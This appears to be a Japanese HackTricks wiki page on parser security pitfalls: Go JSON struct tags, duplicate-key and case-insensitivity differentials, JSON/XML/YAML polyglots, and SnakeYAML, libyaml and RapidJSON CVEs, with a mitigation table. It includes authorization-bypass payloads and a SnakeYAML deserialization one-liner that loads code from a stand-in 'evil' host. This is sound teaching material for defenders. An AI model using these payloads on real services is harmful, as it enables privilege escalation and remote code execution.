# JSON, XML & Yaml Hacking & Issues

{{#include ../banners/hacktricks-training.md}}

## Go JSON デコーダ

Go JSON で以下の問題が検出されましたが、他の言語にも存在する可能性があります。これらの問題は[**このブログ投稿**](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/)で公開されました。

Go の JSON、XML、および YAML パーサーには、一貫性のない長い履歴と、安全でないデフォルトがあり、これを悪用して**認証をバイパス**したり、**権限を昇格**させたり、**機密データを抽出**したりすることができます。


### (Un)Marshaling 予期しないデータ

目的は、攻撃者が機密フィールド（例：`IsAdmin`、`Password`）を読み書きできる構造体を悪用することです。

- 例の構造体:
```go
type User struct {
Username string `json:"username,omitempty"`
Password string `json:"password,omitempty"`
IsAdmin  bool   `json:"-"`
}
```
- 一般的な脆弱性

1. **タグが欠落している** (タグなし = フィールドはデフォルトでまだ解析される):
```go
type User struct {
Username string
}
```
ペイロード:
```json
{"Username": "admin"}
```
2. **`-`の誤った使用**:
```go
type User struct {
IsAdmin bool `json:"-,omitempty"` // ❌ wrong
}
```
ペイロード:
```json
{"-": true}
```
✔️ フィールドを(アン)マーシャルされないようにブロックする正しい方法:
```go
type User struct {
IsAdmin bool `json:"-"`
}
```
### パーサーの差異

目的は、異なるパーサーが同じペイロードを異なって解釈する方法を利用して認証をバイパスすることです。例えば：
- CVE-2017-12635: 重複キーによるApache CouchDBのバイパス
- 2022: XMLパーサーの不整合によるZoomの0クリックRCE
- GitLab 2025 SAMLのバイパスによるXMLの特異性

**1. 重複フィールド:**
Goの`encoding/json`は**最後の**フィールドを取ります。
```go
json.Unmarshal([]byte(`{"action":"UserAction", "action":"AdminAction"}`), &req)
fmt.Println(req.Action) // AdminAction
```
他のパーサー（例：JavaのJackson）は**最初**を取るかもしれません。

**2. 大文字小文字の区別:**
Goは大文字小文字を区別しません：
```go
json.Unmarshal([]byte(`{"AcTiOn":"AdminAction"}`), &req)
// matches `Action` field
```
ユニコードトリックも機能します:
```go
json.Unmarshal([]byte(`{"aKtionſ": "bypass"}`), &req)
```
**3. クロスサービスの不一致:**
想像してみてください:
- Goで書かれたプロキシ
- Pythonで書かれたAuthZサービス

攻撃者が送信します:
```json
{
"action": "UserAction",
"AcTiOn": "AdminAction"
}
```
- Pythonは`UserAction`を認識し、それを許可します
- Goは`AdminAction`を認識し、それを実行します


### データフォーマットの混乱 (ポリグロット)

目的は、フォーマット（JSON/XML/YAML）を混在させるシステムを悪用すること、またはパーサーエラーでオープンに失敗するシステムを悪用することです。例えば：
- **CVE-2020-16250**: HashiCorp Vaultは、STSがXMLの代わりにJSONを返した後、XMLパーサーでJSONを解析しました。

攻撃者が制御するもの：
- `Accept: application/json` ヘッダー
- JSONボディの部分的な制御

GoのXMLパーサーはそれを**とにかく**解析し、注入されたアイデンティティを信頼しました。

- 作成されたペイロード：
```json
{
"action": "Action_1",
"AcTiOn": "Action_2",
"ignored": "<?xml version=\"1.0\"?><Action>Action_3</Action>"
}
```
- **Go JSON** パーサー: `Action_2` (大文字小文字を区別しない + 最後が勝つ)
- **YAML** パーサー: `Action_1` (大文字小文字を区別する)
- **XML** パーサー: 文字列内の `"Action_3"` を解析する

---

## 注目すべきパーサーの脆弱性 (2023-2025)

> 次の公に悪用可能な問題は、安全でないパースが多言語の問題であることを示しています — 単なるGoの問題ではありません。

### SnakeYAML デシリアライズ RCE (CVE-2022-1471)

* 影響を受ける: `org.yaml:snakeyaml` < **2.0** (Spring-Boot、Jenkinsなどで使用される)。
* 根本原因: `new Constructor()` が **任意のJavaクラス** をデシリアライズし、リモートコード実行に至るガジェットチェーンを可能にします。
* ワンライナー PoC (脆弱なホストで計算機を開きます):
```yaml
!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://evil/"] ] ] ]
```
* 修正 / 緩和策:
1. **≥2.0にアップグレード**（デフォルトで`SafeLoader`を使用）。
2. 古いバージョンでは、明示的に`new Yaml(new SafeConstructor())`を使用。

### libyaml ダブルフリー (CVE-2024-35325)

* 影響: `libyaml` ≤0.2.5（多くの言語バインディングで利用されるCライブラリ）。
* 問題: `yaml_event_delete()`を2回呼び出すとダブルフリーが発生し、攻撃者がこれをDoSや、場合によってはヒープの悪用に変えることができる。
* ステータス: 上流は「APIの誤用」として拒否したが、Linuxディストリビューションはポインタを防御的にnull-freeにするパッチを当てた**0.2.6**を出荷した。

### RapidJSON 整数 (アンダー|オーバー) フロー (CVE-2024-38517 / CVE-2024-39684)

* 影響: Tencent **RapidJSON** コミット`8269bc2`以前（<1.1.0-patch-22）。
* バグ: `GenericReader::ParseNumber()`での未チェックの算術演算により、攻撃者が巨大な数値リテラルを作成し、それがラップアラウンドしてヒープを破損させる — 最終的に、結果として得られるオブジェクトグラフが認可決定に使用されるときに特権昇格を可能にする。

---

### 🔐 緩和策 (更新)

| リスク                                | 修正 / 推奨事項                                      |
|-------------------------------------|------------------------------------------------------------|
| 不明なフィールド (JSON)               | `decoder.DisallowUnknownFields()`                          |
| 重複フィールド (JSON)                 | ❌ stdlibに修正なし — [`jsoncheck`](https://github.com/dvsekhvalnov/johnny-five)で検証 |
| 大文字小文字を区別しない一致 (Go)     | ❌ 修正なし — 構造体タグを検証 + 入力を事前正規化   |
| XML ゴミデータ / XXE                  | 強化されたパーサーを使用 (`encoding/xml` + `DisallowDTD`)     |
| YAML 不明なキー                       | `yaml.KnownFields(true)`                                   |
| **安全でない YAML デシリアライズ**     | SafeConstructorを使用 / SnakeYAML ≥2.0にアップグレード            |
| libyaml ≤0.2.5 ダブルフリー          | **0.2.6**またはディストリビューションパッチ済みリリースにアップグレード            |
| RapidJSON <パッチ済みコミット         | 最新のRapidJSON（≥2024年7月）に対してコンパイル              |

## 参考文献

- Baeldung – “SnakeYAML 2.0でCVE-2022-1471を解決する”
- Ubuntu Security Tracker – CVE-2024-35325 (libyaml)

{{#include ../banners/hacktricks-training.md}}
